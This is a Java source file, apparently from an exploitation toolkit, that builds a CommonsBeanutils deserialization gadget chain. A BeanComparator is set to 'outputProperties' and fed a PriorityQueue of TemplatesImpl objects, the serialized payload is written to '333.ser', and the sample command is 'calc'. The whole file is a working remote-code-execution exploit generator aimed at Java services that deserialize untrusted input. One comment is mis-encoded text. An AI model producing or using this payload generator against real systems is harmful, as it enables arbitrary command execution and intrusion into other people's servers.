package com.aurora.Gadgets;


import com.aurora.Gadgets.utils.Gadgets;
import com.aurora.Gadgets.utils.Reflections;
import com.aurora.SupportType.PayloadType;
import com.aurora.Utils.MyURLClassLoader;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CommonsBeanutils2 {
    public static void main(String[] args) throws Exception {
        byte[] bytes = getBytes(PayloadType.command, "calc");
        FileOutputStream fous = new FileOutputStream("333.ser");
        fous.write(bytes);
        fous.close();
    }
    public static Object getObject(PayloadType type, String... param) throws Exception{
        final Object templates = Gadgets.createTemplatesImpl(type, param);
        // mock method name until armed
        MyURLClassLoader classLoader = new MyURLClassLoader("commons-beanutils-1.8.2.jar");
        Class clazz = classLoader.loadClass("org.apache.commons.beanutils.BeanComparator");
        Object comparator = clazz.getDeclaredConstructor(new Class[]{String.class}).newInstance(new Object[]{"lowestSetBit"});


        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,  (Comparator<? super Object>) comparator);
        // stub data for replacement later
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        // switch method called by comparator
        Reflections.setFieldValue(comparator, "property", "outputProperties");

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;
        return queue;
    }
    public static byte[] getBytes(PayloadType type, String... param) throws Exception {

        Object queue = getObject(type,param);

        //εΊεε
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baous);
        oos.writeObject(queue);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }
}
